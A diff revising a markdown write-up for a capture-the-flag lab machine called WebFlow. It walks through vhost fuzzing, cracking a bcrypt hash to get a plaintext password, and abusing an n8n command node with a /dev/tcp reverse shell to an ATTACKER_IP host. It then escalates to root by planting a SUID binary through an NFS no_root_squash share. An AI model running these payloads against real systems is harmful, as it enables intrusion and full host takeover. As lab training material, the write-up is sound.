@@ -18,15 +18,17 @@ This write-up documents the exploitation process for the **WebFlow** machine on 
 
 The attack chain involved the following stages:
 
-* Subdomain enumeration
-* Web application analysis
-* n8n workflow abuse
-* Credential extraction
+* Network reconnaissance
+* Subdomain discovery
+* Web application enumeration
+* Automation panel discovery (n8n)
+* Hash extraction from application files
+* Password cracking
+* Authenticated abuse of automation workflows
 * Reverse shell access
-* NFS misconfiguration discovery
-* Privilege escalation via **SUID binary placed through NFS**
+* Privilege escalation through **NFS misconfiguration**
 
-Instead of only reproducing the provided solution, I focused on understanding **why the attack works**, especially the **NFS privilege escalation technique**, which was a new concept for me.
+This machine required chaining multiple techniques together rather than exploiting a single vulnerability.
 
 ---
 
@@ -38,88 +40,190 @@ The first step was identifying exposed services using **Nmap**.
 nmap -p- -Pn --open --min-rate 1200 172.16.9.54
 ```
 
-After identifying open ports, a more detailed scan was performed.
+The scan revealed two open ports:
 
-```bash
-nmap -p PORTS -sVC 172.16.9.54 -vvv
+```
+22/tcp
+80/tcp
 ```
 
-This allowed identification of the services running on the system.
+Next, a service detection scan was performed.
 
-The most interesting target was the **web service**, which became the initial attack vector.
+```bash
+nmap -p 22,80 -sVC 172.16.9.54 -vvv
+```
+
+Results:
+
+```
+22/tcp open  ssh
+80/tcp open  http
+```
+
+The main attack surface was the **web service running on port 80**.
+
+---
+
+# Initial Web Access
+
+Opening the page in the browser revealed the hostname:
+
+```
+webflow.hc
+```
+
+Since this hostname did not resolve locally, it was added to the hosts file.
+
+```bash
+echo "172.16.9.54 webflow.hc" | sudo tee -a /etc/hosts
+```
+
+After updating the hosts file, the application loaded correctly.
+
+However, the homepage did not expose much functionality, suggesting the presence of hidden resources such as:
+
+* directories
+* files
+* virtual hosts
 
 ---
 
 # Subdomain Enumeration
 
-The main webpage did not expose significant information, so I began searching for **virtual hosts and subdomains**.
-
-Initially I attempted subdomain fuzzing incorrectly by placing the wordlist directly in the URL:
-
-```
-http://FUZZ.webflow.hc
-```
-
-However, this approach does not work when DNS resolution fails.
-
-To properly enumerate subdomains on the same server, the **HTTP Host header** must be manipulated.
-
-Correct command:
+To discover hidden virtual hosts, I performed subdomain fuzzing using **ffuf**.
 
 ```bash
-ffuf -u http://webflow.hc \
+ffuf -u http://webflow.hc/ \
 -H "Host: FUZZ.webflow.hc" \
 -w subdomains-top1million.txt \
 -c -t 100 -fl 1
 ```
 
-Explanation:
+Important concept:
 
-* `-H "Host: FUZZ.webflow.hc"` forces the web server to treat the request as a different virtual host.
-* `FUZZ` is replaced with entries from the wordlist.
-* The request still goes to the same IP, but the server routes it based on the Host header.
+Instead of relying on DNS resolution, this technique modifies the **HTTP Host header**, allowing discovery of virtual hosts served from the same IP address.
 
-This enumeration eventually revealed a new subdomain hosting an **n8n workflow panel**.
+The scan eventually revealed a valid subdomain:
 
----
+```
+automation.webflow.hc
+```
 
-# Web Application Analysis
+The new subdomain was added to `/etc/hosts`.
 
-Accessing the discovered subdomain exposed an **n8n instance**.
+```bash
+echo "172.16.9.54 automation.webflow.hc" | sudo tee -a /etc/hosts
+```
 
-n8n is an automation platform used to create workflows that can interact with external systems, APIs, or scripts.
-
-Because workflow engines often execute commands or scripts internally, they represent a valuable attack surface.
-
-Exploring the interface and configuration eventually revealed **credentials and secrets stored within the application environment**.
-
-These credentials allowed further interaction with the system.
+Opening the subdomain in the browser exposed an **automation platform login panel**.
 
 ---
 
-# Initial Shell Access
+# Automation Platform Discovery
 
-After experimenting with the workflow functionality, it became possible to trigger **command execution**.
+The panel was identified as **n8n**, an automation workflow platform.
 
-A reverse shell listener was prepared on the attacking machine.
+n8n allows users to create workflows that execute tasks on the server, interact with APIs, and run scripts.
+
+Because workflow engines often execute commands internally, they represent a valuable attack surface.
+
+However, authentication was required before accessing the panel.
+
+---
+
+# Extracting Application Files
+
+Before attempting brute force attacks, I searched for application files that might contain credentials.
+
+Through web enumeration and file access, I retrieved configuration data belonging to the automation service.
+
+One particularly useful artifact was the **application database**, which contained user credentials.
+
+A user account discovered:
+
+```
+kilts
+```
+
+The password was stored as a **bcrypt hash**.
+
+---
+
+# Password Cracking
+
+The hash was saved locally.
+
+```bash
+nano hash.txt
+```
+
+Then cracked using **John the Ripper**.
+
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+After some time the password was recovered:
+
+```
+P@ssw0rd
+```
+
+Credentials obtained:
+
+```
+kilts:P@ssw0rd
+```
+
+---
+
+# Accessing the Automation Panel
+
+Using the recovered credentials, authentication succeeded at:
+
+```
+http://automation.webflow.hc
+```
+
+After logging in, the **n8n dashboard** became accessible.
+
+Inside the dashboard it was possible to create and execute workflows.
+
+---
+
+# Remote Code Execution via Workflow
+
+Within n8n, I created a new workflow.
+
+The platform includes nodes capable of executing system commands.
+
+A reverse shell payload was used.
+
+First, a listener was prepared on the attacking machine.
 
 ```bash
 nc -lvnp 443
 ```
 
-Then a reverse shell payload was executed through the workflow.
+Then the following payload was configured in the command execution node:
 
-Once the connection was established, a shell was obtained as:
+```bash
+/bin/bash -c "sh -i >& /dev/tcp/ATTACKER_IP/443 0>&1"
+```
+
+When the workflow executed, the shell connected back.
+
+Access obtained:
 
 ```
-www-data
+appsvc
 ```
 
 ---
 
 # Shell Stabilization
 
-To obtain a fully interactive shell, stabilization techniques were used.
+The initial shell was not fully interactive, so it was stabilized.
 
 ```bash
 script /dev/null -c bash
@@ -132,62 +236,55 @@ CTRL + Z
 stty raw -echo; fg
 ```
 
-This enables proper terminal interaction and command execution.
+After this, the shell behaved as a proper interactive terminal.
 
 ---
 
-# System Enumeration
+# User Flag
 
-After gaining shell access, standard Linux enumeration was performed.
-
-While inspecting services and filesystem configuration, an interesting finding appeared.
-
-The system had an **NFS share exported from `/tmp`**.
-
-Misconfigured NFS shares can lead to privilege escalation depending on their export configuration.
-
----
-
-# NFS Mount
-
-From the attacking machine, the remote NFS share was mounted.
+The user flag was located in the service account directory.
 
 ```bash
-sudo mount -t nfs 172.16.9.54:/tmp /tmp/malicious
+cd /home/appsvc
+ls
+cat user.txt
 ```
-
-This allowed interaction with the remote `/tmp` directory as if it were local.
-
-At this point, I suspected a possible **NFS privilege configuration issue**.
 
 ---
 
-# Understanding the Vulnerability
+# Privilege Escalation
 
-The vulnerability relies on an NFS export configuration using:
+During enumeration I discovered that `/tmp` was exported through **NFS**.
+
+Inspection of the NFS configuration revealed the following option:
 
 ```
 no_root_squash
 ```
 
-Normally NFS performs **root squashing**, which maps root operations on the client to a restricted user such as `nobody`.
+Normally, NFS maps root operations from the client to a restricted user (`nobody`).
+However, when **no_root_squash** is enabled, root on the client machine remains root on the server.
 
-However, when **no_root_squash** is enabled:
-
-* root on the client machine
-* remains root on the server
-
-This means files created by root on the mounted share will remain **owned by root on the target system**.
-
-This behavior can be abused to place **SUID root binaries** on the server.
+This misconfiguration allows attackers to create **root-owned files on the target system**.
 
 ---
 
-# Privilege Escalation Strategy
+# Mounting the NFS Share
 
-To exploit this behavior, a custom **SUID root binary** was created.
+On the attacking machine, the share was mounted.
 
-First, a simple C program was written:
+```bash
+mkdir /tmp/malicious
+sudo mount -t nfs 172.16.9.54:/tmp /tmp/malicious
+```
+
+The remote `/tmp` directory was now accessible locally.
+
+---
+
+# Creating a Root SUID Binary
+
+To exploit the misconfiguration, a small C program was created to spawn a root shell.
 
 ```c
 #include <unistd.h>
@@ -207,7 +304,7 @@ Compile the program:
 gcc exploit.c -o exploit
 ```
 
-Copy the binary into the mounted NFS directory:
+Copy the binary into the mounted NFS share:
 
 ```bash
 cp exploit /tmp/malicious/
@@ -220,13 +317,13 @@ sudo chown root:root /tmp/malicious/exploit
 sudo chmod 4755 /tmp/malicious/exploit
 ```
 
-Because the share allows **root-level file operations**, the binary becomes a **root-owned SUID executable on the target system**.
+Because the NFS share allows **root operations**, the binary becomes a **root-owned SUID executable on the target machine**.
 
 ---
 
 # Root Access
 
-Returning to the shell on the victim machine, the binary could now be executed.
+Returning to the shell on the victim machine:
 
 ```bash
 /tmp/exploit
@@ -261,15 +358,16 @@ cat root.txt
 
 # Skills Practiced
 
-* Subdomain enumeration with ffuf
-* HTTP Host header fuzzing
+* Nmap enumeration
+* Virtual host fuzzing with ffuf
 * Web application analysis
-* Workflow engine exploitation
+* Credential extraction from application files
+* Password cracking with John the Ripper
+* Automation platform abuse
 * Reverse shell techniques
 * Shell stabilization
-* NFS misconfiguration exploitation
-* SUID privilege escalation
-* Basic exploit development in C
+* NFS privilege escalation
+* SUID binary exploitation
 
 ---
 
@@ -289,14 +387,13 @@ Difficulty: Easy
 
 # Personal Notes
 
-One of the most interesting parts of this machine was the **NFS privilege escalation technique**.
+This machine reinforced several important pentesting concepts.
 
-Initially I followed the steps from the solution, but I took time to understand why the attack works.
+The most interesting parts were:
 
-The key concept is the **no_root_squash** configuration.
+* discovering hidden virtual hosts through **Host header fuzzing**
+* extracting credentials from application files
+* abusing an automation platform to gain command execution
+* exploiting an **NFS configuration mistake** to escalate privileges
 
-When this option is enabled, root on the client machine remains root on the NFS server. This allows an attacker to create files that remain owned by root on the target system.
-
-By planting a **SUID root binary**, an attacker can escalate privileges and gain full control of the system.
-
-Understanding the **underlying mechanism** behind the attack is far more valuable than simply reproducing the steps.
+The NFS privilege escalation was particularly valuable to understand, as it demonstrates how a misconfigured network file system can completely compromise a host.
